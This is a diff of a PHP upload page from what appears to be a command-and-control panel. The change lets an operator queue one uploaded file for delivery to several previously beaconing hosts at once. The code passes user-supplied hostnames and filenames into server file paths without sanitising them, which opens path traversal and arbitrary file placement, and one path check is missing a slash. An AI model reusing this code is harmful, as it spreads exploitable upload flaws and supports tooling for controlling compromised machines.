@@ -65,7 +65,7 @@
     <div class="container"> <!-- Start of main body container -->
       <form role="form" class="form-inline" method="post" enctype="multipart/form-data"> <!-- Start of task file upload form -->
         <div class="form-group">
-          <select name="hostname">
+          <select multiple class="form-control" name="hostname[]"> <!-- Hostname array in case they select multiple hostnames -->
           <?php
             # Determines the hosts that have previously beaconed
             $statement = $dbConnection->prepare("SELECT hostname FROM hosts");
@@ -93,54 +93,58 @@
         # If the user clicked "Task File Upload"
         if (isset($_POST["submit"]))
         {
-          $hostname = $_POST["hostname"]; # Tasked hostname
-
           # If all fields are set
-          if (isset($hostname) && !empty($hostname) && $_FILES["upload"]["error"] == 0)
+          if (isset($_POST["hostname"]) && !empty($_POST["hostname"]) && $_FILES["upload"]["error"] == 0)
           {
             # If uploaded file size is greater than zero bytes
             if ($_FILES["upload"]["size"] > 0)
             {
-              # Does the /var/www/html/uploads/<SYSTEM> directory exist?
-              # If not we create the directory
-              if (!file_exists("/var/www/html/uploads". $hostname))
+              # For loop to loop through each hostname that was selected for a task
+              for ($counter = 0; $counter < sizeof($_POST["hostname"]); $counter++)
               {
-                mkdir("/var/www/html/uploads/" . $hostname);
+                $hostname = $_POST["hostname"][$counter]; # Current hostname from for loop
+
+                # Does the /var/www/html/uploads/<SYSTEM> directory exist?
+                # If not we create the directory
+                if (!file_exists("/var/www/html/uploads". $hostname))
+                {
+                  mkdir("/var/www/html/uploads/" . $hostname);
+                }
+                
+                # Copies uploaded file from the /tmp directory to the /var/www/html/uploads/<SYSTEM> directory
+                $filename = $_FILES["upload"]["name"];
+                $tempFilePath = $_FILES["upload"]["tmp_name"];
+                $fileDestination = "/var/www/html/uploads/" . $hostname . "/" . $filename;
+                copy($tempFilePath, $fileDestination); # Uses copy() instead of move_uploaded_file() in case there are multiple hostnames that you want to task a file upload for
+
+                # Inserts upload task into "tasks" table
+                $upload = "/uploads/" . $hostname . "/" . $filename;
+                $statement = $dbConnection->prepare("INSERT INTO tasks (user, action, hostname, secondary) VALUES (:user, :action, :hostname, :secondary)");
+                $statement->bindValue(":user", $_SESSION["username"]);
+                $statement->bindValue(":action", "upload");
+                $statement->bindValue(":hostname", $hostname);
+                $statement->bindValue(":secondary", $upload);  
+                $statement->execute();
+
+                # Inserts hostname, action, secondary, and status into "output" table
+                $statement = $dbConnection->prepare("INSERT INTO output (user, hostname, action, secondary, status) VALUES (:user, :hostname, :action, :secondary, :status)");
+                $statement->bindValue(":user", $_SESSION["username"]);
+                $statement->bindValue(":hostname", $hostname);
+                $statement->bindValue(":action", "upload");
+                $statement->bindValue(":secondary", $upload);
+                $statement->bindValue(":status", "N");
+                $statement->execute();
               }
-                    
-              # Moves uploaded file from the /tmp directory to the /var/www/html/uploads/<SYSTEM> directory
-              $filename = $_FILES["upload"]["name"];
-              $tempFilePath = $_FILES["upload"]["tmp_name"];
-              $fileDestination = "/var/www/html/uploads/" . $hostname . "/" . $filename;
-              move_uploaded_file($tempFilePath, $fileDestination);
 
-              # Inserts upload task into "tasks" table
-              $upload = "/uploads/" . $hostname . "/" . $filename;
-              $statement = $dbConnection->prepare("INSERT INTO tasks (user, action, hostname, secondary) VALUES (:user, :action, :hostname, :secondary)");
-              $statement->bindValue(":user", $_SESSION["username"]);
-              $statement->bindValue(":action", "upload");
-              $statement->bindValue(":hostname", $hostname);
-              $statement->bindValue(":secondary", $upload);  
-              $statement->execute();
-
-              # Inserts hostname, action, secondary, and status into "output" table
-              $statement = $dbConnection->prepare("INSERT INTO output (user, hostname, action, secondary, status) VALUES (:user, :hostname, :action, :secondary, :status)");
-              $statement->bindValue(":user", $_SESSION["username"]);
-              $statement->bindValue(":hostname", $hostname);
-              $statement->bindValue(":action", "upload");
-              $statement->bindValue(":secondary", $upload);
-              $statement->bindValue(":status", "N");
-              $statement->execute();
-                                
               # Kills database connection
               $statement->connection = null;
 
-              # Displays success message - "Successfully tasked file upload. Redirecting back to upload.php in 3 seconds. Do not refresh the page."
-              echo "<br><div class='alert alert-success'>Successfully tasked file upload. Redirecting back to upload.php in 3 seconds. Do not refresh the page.</div>";
+              # Displays success message - "Successfully tasked file upload. Redirecting back to upload.php in 1 seconds. Do not refresh the page."
+              echo "<br><div class='alert alert-success'>Successfully tasked file upload. Redirecting back to upload.php in 1 seconds. Do not refresh the page.</div>";
 
               # Waits 3 seconds, then redirects to uploadSubmit.php
               # This is a hack to clear out the POST data
-              header('Refresh: 3; URL=uploadSubmit.php');
+              header('Refresh: 1; URL=uploadSubmit.php');
             }
             # Else file is zero bytes
             else
@@ -159,4 +163,4 @@
       ?>
     </div> <!-- End main body container -->
   </body> <!-- End of body -->
-</html
+</html>
